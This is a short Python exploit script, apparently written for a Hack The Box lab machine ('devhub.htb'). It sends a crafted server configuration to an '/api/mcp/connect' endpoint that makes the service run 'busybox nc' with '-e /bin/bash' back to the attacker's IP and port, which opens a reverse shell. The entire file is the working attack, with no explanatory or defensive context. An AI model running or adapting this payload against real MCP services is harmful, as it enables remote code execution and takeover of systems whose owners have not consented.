#! /bin/python
import requests
import json


target = "http://devhub.htb:6274/"
ip = "10.10.15.118"
port = "9000"

url = f'{target}/api/mcp/connect'


data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)
